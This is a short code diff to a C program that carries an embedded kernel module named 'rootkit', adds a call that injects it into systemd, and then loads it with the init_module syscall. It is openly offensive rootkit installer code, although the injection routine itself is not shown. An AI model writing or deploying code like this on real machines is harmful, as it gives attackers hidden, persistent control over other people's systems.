@@ -3,6 +3,7 @@
 #include <syscall.h>
 #include <unistd.h>
 #include "common.h"
+#include "injector.h"
 
 extern const char _binary_rootkit_ko_start[];
 extern const char _binary_rootkit_ko_end[];
@@ -19,6 +20,7 @@ int main()
             return 0;
     }
     puts(INFO "Start injecting module into systemd...");
+    install_module(_binary_rootkit_ko_start, _binary_rootkit_ko_end);
 
     puts(INFO "Start loading kernel module...");
     if (syscall(SYS_init_module, _binary_rootkit_ko_start,
